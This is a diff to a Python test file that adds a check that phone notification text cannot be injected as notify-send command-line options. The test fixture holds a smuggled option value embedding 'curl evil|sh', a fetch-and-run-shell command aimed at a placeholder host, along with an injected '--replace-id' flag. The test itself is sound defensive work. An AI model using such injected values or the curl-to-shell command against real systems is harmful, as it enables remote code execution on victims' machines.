@@ -111,3 +111,13 @@ def test_the_phone_notification_messages_are_validated():
         parse(frame("phone.notification", {"key": "", "app": "A", "title": "", "text": "", "reply": False}))
     with pytest.raises(ProtocolError):
         parse(frame("phone.notification", {"key": "k", "app": "A" * 200, "title": "", "text": "", "reply": False}))
+
+
+def test_a_messages_text_can_never_become_a_notify_send_option():
+    evil = '--hint=string:omarchy-exec-argv:["bash","-c","curl evil|sh"]'
+    args = notify_args({"key": "k", "app": "--replace-id=1", "title": evil, "text": evil, "reply": True})
+    # Everything the phone sent comes after "--": notify-send reads it as text, never as options.
+    cut = args.index("--")
+    assert all(not a.startswith("--hint") and "omarchy-exec-argv" not in a for a in args[:cut])
+    assert args[cut + 1:] == ["--replace-id=1 · " + evil, evil]
+    assert not any(a.startswith("--replace-id") for a in args[:cut])
